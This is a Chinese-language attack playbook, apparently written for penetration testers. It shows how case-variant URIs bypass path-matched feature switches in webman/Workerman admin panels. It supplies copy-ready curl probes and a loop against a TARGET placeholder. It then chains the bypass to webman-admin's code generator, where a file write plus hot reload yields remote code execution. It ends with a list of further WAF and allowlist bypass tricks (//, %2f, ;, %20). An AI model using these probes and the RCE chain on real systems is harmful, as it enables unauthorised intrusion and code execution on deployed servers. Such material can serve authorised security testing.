# 通用技巧：webman（workerman 系）路由大小写不敏感 × 业务侧「功能开关/路径黑名单」按精确路径匹配 ⇒ 大小写变体绕过开关

## 原理
1. webman/Workerman 的路由匹配对 URI 路径**大小写不敏感**：`/app/admin/TABLE/SELECT` 与 `/app/admin/table/select` 都能分发到 `TableController::select()`。
   - 验证方法：请求一个不存在的方法名，若仍返回 404 的 “xxx not found” 且大小写da小写都能命中/都不命中，说明路由表按不敏感匹配；
   - 交叉验证：把**不受开关管辖**的路由也换大小写（如 `/app/admin/Account/Info`），若返回与原始路径完全相同的响应（这里是 `<script>top.location.href='/app/admin';</script>`），即可确认“大小写变体走的是同一条原路由”，而不是另注册了假路由。
2. 很多运营方会在部署版加一层「功能未开放」的开关（典型响应：HTTP 200 + `{"code":403,"message":"该功能正在进行中，默认关闭"}`），实现方式通常是中间件里对 `$request->path()` 做 `in_array`/精确 `str_starts_with` 判断。**这种判断区分大小写**，于是绕过的钥匙就是 URI 大小写。
3. 注意实现不一致：同一站点里可能有的组是「按 action 精确匹配」（可绕）、有的组是「按前缀匹配」（`/app/admin/dev/` 那组大小写都拦）。**必须逐条实测，不能假设整站可绕。**

## 探测命令（照抄即可）
```bash
# 基线：小写（命中开关）
curl -sk -o- https://TARGET/app/admin/table/select
#   期望：{"code":403,"message":"该功能正在进行中，默认关闭"}

# 绕过：大写 / 混合大小写
curl -sk -o- https://TARGET/app/admin/TABLE/SELECT
curl -sk -o- https://TARGET/app/admin/Table/Select
#   期望：不再是开关那句 JSON，而是下一层（鉴权 401 / 业务 500 / 真实数据）

# 同族把开关管的其它组一起试
for p in plugin/index plugin/install dev/form-build im/group/list monitor/server maintenance/task/list; do
  for v in "$p" "$(echo $p | tr 'a-z' 'A-Z')"; do
    printf '%-28s ' "$v"; curl -sk -o- "https://TARGET/app/admin/$v" | head -c 120; echo
  done
done

# 交叉验证（排除“假路由”误判）：换一条不受开关管辖的路由的大小写
curl -sk -o- https://TARGET/app/admin/Account/Info   # 与 /app/admin/account/info 响应应完全一致
# 路由存在性对照
curl -sk -o- https://TARGET/app/admin/TABLE/nonexistentxyz   # 期望："/app/admin/TABLE/nonexistentxyz not found"
```

## 为什么值得绕：把开关背后的写文件原语救回来
webman-admin 的代码生成器 `plugin/admin/app/controller/TableController.php` 里
`createController()` / `createModel()` 直接 `file_put_contents($file, ...)` 写 **`app/controller/*.php` 与 model 文件**，
而 webman 的 `config/process.php` Monitor 进程**监听 `app/`、`config/`、`plugin/*/{app,config,api}` 并热重载**：
只要能到达生成器的写动作（`/app/admin/table/crud`、`/app/admin/table/create|modify`），就是**一条 file_put_contents → 热重载 → RCE** 的路，
比上传马/写 config 更直接。运营方常用“功能关闭”开关掩盖这条入口，大小写即可绕过开关（鉴权仍要自己解决）。

## 同类场景迁移
- ThinkPHP / Laravel / Spring 的路由都不区分 URL 大小写（Spring 默认 PathPattern 区分大小写，需实测）；
- 任何“按 `$request->path()` 精确匹配”的自研 WAF / 鉴权白名单 / 功能开关，都优先试：大小写、`//`、`/./`、末尾 `/`、`%2f`、`;`、`%20`；
- 探测思路固定为三步：**① 基线（开关响应）→ ② 变体（是否换响应）→ ③ 交叉验证（非开关路由的同类变体响应是否一致，排除假路由）**。
